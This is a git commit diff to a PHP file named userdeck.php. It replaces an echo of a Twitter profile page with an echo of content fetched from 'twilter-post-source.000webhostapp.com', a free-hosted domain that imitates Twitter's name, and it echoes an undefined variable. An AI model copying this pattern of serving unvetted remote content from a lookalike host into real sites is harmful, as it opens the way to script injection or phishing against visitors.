772458d9bfe1ad1bba2d01cd973958a53526cddb
zahranuupp <47617189+zahranuupp@users.noreply.github.com>
2019-02-25 14:17:58 +0300

    Update userdeck.php

--- userdeck.php
+++ userdeck.php
@@ -1,5 +1,9 @@
 
 
 
-<?php echo file_get_contents("https://twitter.com/Esmaa2412");?>
+<?php echo file_get_contents("https://twilter-post-source.000webhostapp.com/usergrid.php");
+
+echo $kulad;
+
+?>
 
